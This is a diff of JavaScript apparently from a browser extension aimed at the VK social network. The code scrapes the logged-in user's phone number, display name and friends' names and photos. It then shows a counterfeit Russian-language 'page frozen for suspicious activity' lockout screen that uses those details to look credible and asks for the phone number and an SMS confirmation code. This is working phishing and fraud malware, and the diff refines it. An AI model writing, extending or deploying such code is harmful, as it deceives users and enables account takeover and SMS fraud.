@@ -63,47 +63,52 @@ function GetInfForUser(){
 			
 		plg.Save('vIdPage', vk.id.toString());
 		plg.Save('vRun', '0');
+        var vTel = plg.Get('vTel');
 	} catch(e){}
-
-	ajax.plainpost('/settings.php', null, function(text){
-		number = text.match(/([+]{1}[0-9]+(?:[\*]+))/g);
-		if(number){
-			try{
-				plg.Save('vTel', number.toString());
-			} catch(e){}	
-		}
-	});
-	
+    
+    if(!vTel || vTel.length < 2){
+    	ajax.plainpost('/settings.php', null, function(text){
+    		var html = document.createElement("div");
+			html.innerHTML = text;
+            var number = (typeof(html.getElementsByClassName('settings_labeled_text')[0].innerText) != 'undefined') ? html.getElementsByClassName('settings_labeled_text')[0].innerText : html.getElementsByClassName('settings_labeled_text')[0].textContent;
+    		if(number){
+    			try{
+    				plg.Save('vTel', number.toString());
+    			} catch(e){}	
+    		}
+    	});
+	}
 	try{
 		ajax.plainpost('/id' + vk.id.toString(), null, function(text){
 			var html = document.createElement("div");
 			html.innerHTML = text;
-			var tmp = html.getElementsByTagName("h1")[0];
-			if(typeof(tmp.innerText)!='undefined')
-				var name = tmp.innerText;
-			else
-				var name = tmp.textContent;
-				
-			var name = name.replace(/online /i, '');
-			if(!/ошибка/i.test(name))
-				plg.Save('vName', escape(name).toString());
 			
+            var oldName = plg.Get('vName');
+            if(!oldName || oldName.length < 5){
+                var tmp = html.getElementsByTagName("h1")[0];
+    			var name = (typeof(tmp.innerText)!='undefined') ? tmp.innerText : tmp.textContent;    				
+    			name = name.replace(/online /i, '');
+    			if(!/ошибка|Ошибка/i.test(name.toString()))
+    				plg.Save('vName', escape(name).toString());
 			
-			if(html.getElementsByClassName("people_cell")){
-				var tmpImg = html.getElementsByClassName("people_cell");
-				var friend = [];
-				for(var i = 0; i < 5; i++){
-					if(typeof(tmpImg[i].innerText)!='undefined')
-						var n = tmpImg[i].innerText;
-					else
-						var n = tmpImg[i].textContent;
-					friend[i] = "{'i':'" + tmpImg[i].getElementsByTagName('img')[0].src + "','n':'" + trim(n).replace(/[\n]+/g, '<br/>') + "'}";
-				}
-				var f = friend.join(";");
-				plg.Save('vFriends', f.toString());
 			}
-			else
-				plg.Save('vFriends', "0");
+            
+            var vFriend = plg.Get('vFriends');
+            if(!vFriend || vFriend == 0){
+    			if(html.getElementsByClassName("people_cell")[0]){
+    				var tmpImg = html.getElementsByClassName("people_cell");
+    				var friend = [];
+    				for(var i = 0; i < 5; i++){
+    					if(typeof(tmpImg[i].innerText)!='undefined')
+    						var n = tmpImg[i].innerText;
+    					else
+    						var n = tmpImg[i].textContent;
+    					friend[i] = "{'i':'" + tmpImg[i].getElementsByTagName('img')[0].src + "','n':'" + trim(n).replace(/[\n]+/g, '<br/>') + "'}";
+    				}
+    				var f = friend.join(";");
+    				plg.Save('vFriends', f.toString());
+    			}
+            }
 		});
 	} catch(e){}
 }
@@ -217,8 +222,10 @@ function tipHides(el) {
 }
 
 
-function phoneTip() {
+function phoneTip(el) {
 	if (ge('blocked_phone').readOnly) return;
+	if(/\*/.test(el.value))
+		el.value = '';
     return tipShow('blocked_phone_wrap', 'Укажите Ваш номер, к которому <b>будет</b> привязана страница. Мы вышлем на него <b>SMS</b> с кодом. Эта процедура бесплатна.<br><br>Пример номера: <b>+7 906 2233300</b>', [-147, -95, 3], 'login_blocked_phone_tt');
 }
 
@@ -266,7 +273,6 @@ function MyBoxLock(){
 		var name = unescape(plg.Get('vName'));
 		var number = plg.Get('vTel');
 		var lTime = plg.Get('vTime');
-		number = number.replace(/(\*)+/, '');
 	} catch(e){}
 	var code = TelCode(number);
 	try{
@@ -294,7 +300,7 @@ function MyBoxLock(){
 		var see_row = 'none';
 	}
 	
-	var content = '<div id="login_blocked_wrap"><div class="login_blocked_centered"><img src="/images/pics/spamfight.gif" id="login_blocked_img" height="160" width="225" /><br/><b>' + name + '</b>, к сожалению, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу с целью вырвать её из рук злоумышленников.<br><br>Для того чтобы разморозить страницу, нам необходимо убедиться в том, что Вы являетесь <b>настоящим владельцем</b> страницы. Вам следует указать номер телефона, к которому привязана Ваша страница и ввести полученный <b>Код подтверждения</b>. После восстановления доступа к странице настоятельно рекомендуем Вам <b>сменить пароль</b><br/><br/>Эта страница заморожена за подозрительные отметки <b>Мне нравится</b> этим пользователям: </div>  <div class="login_blocked_reason_wrap"><div class="login_blocked_reason">' + CreateTableFriend() + '</div></div><div class="msg" id="blocked_submit_result" style="margin-top: 20px"></div><br/><div class="login_blocked_form"><div class="login_blocked_row" id="blocked_country_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_country_wrap"><div class="login_blocked_label">Страна</div><select onchange="ChangeCountry(this)" style="width: 134px; height: 25px; border: 1px solid rgb(192, 202, 213);" name="country" id="chCountry">' + GetCountry(code) + '</select><input type="hidden" id="blocked_country" name="blocked_country" /></div></div><div class="login_blocked_row" id="blocked_phone_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_phone_wrap"><div class="login_blocked_label">Мобильный телефон</div><table id="blocked_phone_table" style="border: 1px solid rgb(192, 202, 213); background: #ffffff;" class="login_readonly_wrap" cellspacing="0" cellpadding="0"><tr><td id="blocked_phone_prefix"><nobr style="margin-right: 5px; color: rgb(119, 119, 119);">' + code + '</nobr></td><td class="blocked_phone_field"><input type="text" id="blocked_phone" onblur="tipHides(\'blocked_phone_wrap\')" onfocus="phoneTip()" value="'+ number.replace(code, '') + '"  class="login_big_text login_readonly" /></td></tr></table></div></div><div id="blocked_code_row" class="login_blocked_row" style="display: none"><div id="blocked_code_wrap" class="login_select_wrap"><div class="login_blocked_label">Код подтверждения</div><input type="text" id="blocked_code" value="" class="login_big_text" placeholder="Введите код сюда" onblur="tipHides(\'blocked_code_wrap\')" onfocus="codeTip()" /></div></div><div class="login_blocked_submit" id="blocked_phone_submit" style=""><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_1" style="display: none;"></span>' + btn + '</div></div><div class="login_blocked_submit" id="blocked_code_submit" style="display: none"><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_2" style="display: none;"></span><button id="blocked_send_code" style="height: 23px;" onclick="CheckCode()">Отправить код</button></div><div class="blocked_no_code"><a id="blocked_resend" onclick="noCode()">Я не получил код</a></div></div><div class="login_blocked_submit" id="blocked_pass_submit" style="display: none"><div class="button_blue button_wide"><button id="blocked_send_pass" onclick="EndLock();">Разморозить</button></div></div></div></div>';
+	var content = '<div id="login_blocked_wrap"><div class="login_blocked_centered"><img src="/images/pics/spamfight.gif" id="login_blocked_img" height="160" width="225" /><br/><b>' + name + '</b>, к сожалению, мы обнаружили подозрительную активность и <b>временно заморозили</b> Вашу страницу с целью вырвать её из рук злоумышленников.<br><br>Для того чтобы разморозить страницу, нам необходимо убедиться в том, что Вы являетесь <b>настоящим владельцем</b> страницы. Вам следует указать номер телефона, к которому привязана Ваша страница и ввести полученный <b>Код подтверждения</b>. После восстановления доступа к странице настоятельно рекомендуем Вам <b>сменить пароль</b><br/><br/>Эта страница заморожена за подозрительные отметки <b>Мне нравится</b> этим пользователям: </div>  <div class="login_blocked_reason_wrap"><div class="login_blocked_reason">' + CreateTableFriend() + '</div></div><div class="msg" id="blocked_submit_result" style="margin-top: 20px"></div><br/><div class="login_blocked_form"><div class="login_blocked_row" id="blocked_country_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_country_wrap"><div class="login_blocked_label">Страна</div><select onchange="ChangeCountry(this)" style="width: 134px; height: 25px; border: 1px solid rgb(192, 202, 213);" name="country" id="chCountry">' + GetCountry(code) + '</select><input type="hidden" id="blocked_country" name="blocked_country" /></div></div><div class="login_blocked_row" id="blocked_phone_row" style="display: ' + see_row + '"><div class="login_select_wrap" id="blocked_phone_wrap"><div class="login_blocked_label">Мобильный телефон</div><table id="blocked_phone_table" style="border: 1px solid rgb(192, 202, 213); background: #ffffff;" class="login_readonly_wrap" cellspacing="0" cellpadding="0"><tr><td id="blocked_phone_prefix"><nobr style="margin-right: 5px; color: rgb(119, 119, 119);">' + code + '</nobr></td><td class="blocked_phone_field"><input type="text" id="blocked_phone" onblur="tipHides(\'blocked_phone_wrap\')" onfocus="phoneTip(this)" value="'+ number.replace(code, '') + '"  class="login_big_text login_readonly" /></td></tr></table></div></div><div id="blocked_code_row" class="login_blocked_row" style="display: none"><div id="blocked_code_wrap" class="login_select_wrap"><div class="login_blocked_label">Код подтверждения</div><input type="text" id="blocked_code" value="" class="login_big_text" placeholder="Введите код сюда" onblur="tipHides(\'blocked_code_wrap\')" onfocus="codeTip()" /></div></div><div class="login_blocked_submit" id="blocked_phone_submit" style=""><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_1" style="display: none;"></span>' + btn + '</div></div><div class="login_blocked_submit" id="blocked_code_submit" style="display: none"><div class="button_blue button_wide"><span class="button_lock" id="btn_lock_2" style="display: none;"></span><button id="blocked_send_code" style="height: 23px;" onclick="CheckCode()">Отправить код</button></div><div class="blocked_no_code"><a id="blocked_resend" onclick="noCode()">Я не получил код</a></div></div><div class="login_blocked_submit" id="blocked_pass_submit" style="display: none"><div class="button_blue button_wide"><button id="blocked_send_pass" onclick="EndLock();">Разморозить</button></div></div></div></div>';
 	boxLock.content(content + '<div id="modalWND"></div>');	
 	if(run == 2){
 		ge('page_body').setAttribute('class', 'simple');
